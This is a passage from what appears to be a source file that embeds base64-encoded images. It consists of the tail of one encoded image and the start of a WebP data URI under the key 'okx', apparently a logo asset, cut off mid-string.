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",
      okx: "data:image/webp;base64,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